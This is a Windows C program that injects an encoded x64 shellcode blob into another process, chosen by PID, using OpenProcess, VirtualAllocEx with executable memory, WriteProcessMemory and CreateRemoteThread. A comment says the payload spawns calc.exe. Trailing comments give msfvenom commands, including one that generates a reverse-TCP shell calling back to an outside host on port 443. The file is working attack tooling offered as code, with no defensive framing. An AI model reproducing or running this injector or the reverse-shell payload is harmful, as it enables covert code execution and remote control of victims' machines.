#include<Windows.h>
#include<stdio.h>

int main(int argc, char* argv[])
{
	// spawn calc.exe
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x34\x8b\x16\x32\xcb\x95\xb9\xb5\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xc8\xc3\x95"
		"\xd6\x3b\x7d\x79\xb5\x34\x8b\x57\x63\x8a\xc5\xeb\xe4\x62"
		"\xc3\x27\xe0\xae\xdd\x32\xe7\x54\xc3\x9d\x60\xd3\xdd\x32"
		"\xe7\x14\xc3\x9d\x40\x9b\xdd\xb6\x02\x7e\xc1\x5b\x03\x02"
		"\xdd\x88\x75\x98\xb7\x77\x4e\xc9\xb9\x99\xf4\xf5\x42\x1b"
		"\x73\xca\x54\x5b\x58\x66\xca\x47\x7a\x40\xc7\x99\x3e\x76"
		"\xb7\x5e\x33\x1b\x1e\x39\x3d\x34\x8b\x16\x7a\x4e\x55\xcd"
		"\xd2\x7c\x8a\xc6\x62\x40\xdd\xa1\xf1\xbf\xcb\x36\x7b\xca"
		"\x45\x5a\xe3\x7c\x74\xdf\x73\x40\xa1\x31\xfd\x35\x5d\x5b"
		"\x03\x02\xdd\x88\x75\x98\xca\xd7\xfb\xc6\xd4\xb8\x74\x0c"
		"\x6b\x63\xc3\x87\x96\xf5\x91\x3c\xce\x2f\xe3\xbe\x4d\xe1"
		"\xf1\xbf\xcb\x32\x7b\xca\x45\xdf\xf4\xbf\x87\x5e\x76\x40"
		"\xd5\xa5\xfc\x35\x5b\x57\xb9\xcf\x1d\xf1\xb4\xe4\xca\x4e"
		"\x73\x93\xcb\xe0\xef\x75\xd3\x57\x6b\x8a\xcf\xf1\x36\xd8"
		"\xab\x57\x60\x34\x75\xe1\xf4\x6d\xd1\x5e\xb9\xd9\x7c\xee"
		"\x4a\xcb\x74\x4b\x7a\x71\x94\xb9\xb5\x34\x8b\x16\x32\xcb"
		"\xdd\x34\x38\x35\x8a\x16\x32\x8a\x2f\x88\x3e\x5b\x0c\xe9"
		"\xe7\x70\x65\x0c\x17\x62\xca\xac\x94\x5e\x28\x24\x4a\xe1"
		"\xc3\x95\xf6\xe3\xa9\xbf\xc9\x3e\x0b\xed\xd2\xbe\x90\x02"
		"\xf2\x27\xf9\x79\x58\xcb\xcc\xf8\x3c\xee\x74\xc3\x51\xaa"
		"\xf9\xda\x9b\x51\xf3\x73\x32\xcb\x95\xb9\xb5";


	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}
// msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
// msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=calc.exe -b '\x00\x0A\x0D' -f exe -o a.exe
